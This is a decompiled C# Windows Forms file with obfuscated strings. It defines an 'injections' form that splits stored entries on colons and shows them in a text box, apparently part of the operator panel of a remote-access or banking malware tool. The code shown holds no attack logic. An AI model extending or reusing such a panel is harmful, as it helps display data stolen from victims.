using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class injections : basestyle
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("combojects")]
	private DrakeUIComboBox _combojects;

	public Dictionary<string, string> jectlist;

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIComboBox combojects
	{
		[CompilerGenerated]
		get
		{
			return _combojects;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = combojects_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _combojects;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_combojects = value;
			drakeUIComboBox = _combojects;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	public injections()
	{
		base.Load += injections_Load;
		jectlist = new Dictionary<string, string>();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.injections));
		this.TextBox1 = new System.Windows.Forms.TextBox();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.combojects = new DrakeUI.Framework.DrakeUIComboBox();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.Panel2.SuspendLayout();
		base.SuspendLayout();
		this.myscr.Image = BTMOB.My.Resources.Resources.ject_off;
		this.myscr.Size = new System.Drawing.Size(46, 25);
		this.myscr.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage;
		this.pinbtn.Location = new System.Drawing.Point(670, 5);
		this.minibtn.Location = new System.Drawing.Point(712, 5);
		this.closbtn.Location = new System.Drawing.Point(754, 5);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(786, 18);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(796, 26);
		this.TextBox1.BackColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.TextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.TextBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.TextBox1.ForeColor = System.Drawing.Color.White;
		this.TextBox1.Location = new System.Drawing.Point(2, 108);
		this.TextBox1.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.TextBox1.Multiline = true;
		this.TextBox1.Name = EXGuarder._49521624;
		this.TextBox1.ReadOnly = true;
		this.TextBox1.Size = new System.Drawing.Size(796, 396);
		this.TextBox1.TabIndex = 0;
		this.Panel2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel2.Controls.Add(this.combojects);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(2, 64);
		this.Panel2.Name = EXGuarder._736B0D76;
		this.Panel2.Padding = new System.Windows.Forms.Padding(9);
		this.Panel2.Size = new System.Drawing.Size(796, 44);
		this.Panel2.TabIndex = 40;
		this.combojects.Dock = System.Windows.Forms.DockStyle.Left;
		this.combojects.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.combojects.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.combojects.Font = new System.Drawing.Font(EXGuarder._3E5B1636, 9f);
		this.combojects.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.combojects.Location = new System.Drawing.Point(9, 9);
		this.combojects.Margin = new System.Windows.Forms.Padding(4);
		this.combojects.MinimumSize = new System.Drawing.Size(56, 0);
		this.combojects.Name = EXGuarder._6C4D1C57;
		this.combojects.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.combojects.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.combojects.RectColor = System.Drawing.Color.Gray;
		this.combojects.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.combojects.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom;
		this.combojects.Size = new System.Drawing.Size(276, 25);
		this.combojects.Style = DrakeUI.Framework.UIStyle.Custom;
		this.combojects.TabIndex = 1;
		this.combojects.Text = EXGuarder._6C053001;
		this.combojects.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(800, 506);
		base.Controls.Add(this.TextBox1);
		base.Controls.Add(this.Panel2);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._47176F0B);
		base.Name = EXGuarder._3713651B;
		this.Text = EXGuarder._3713651B;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel2, 0);
		base.Controls.SetChildIndex(this.TextBox1, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void combojects_SelectedIndexChanged(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				string key = combojects.Text;
				if (jectlist.ContainsKey(key))
				{
					string[] array = jectlist[key].Split(':');
					string text = array[0] + EXGuarder._384E5244;
					int num = array.Count() - 1;
					for (int i = 1; i <= num; i++)
					{
						text = text + string.Format(EXGuarder._79195F6F, i) + array[i] + EXGuarder._384E5244;
					}
					TextBox1.Text = text;
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void injections_Load(object sender, EventArgs e)
	{
	}
}
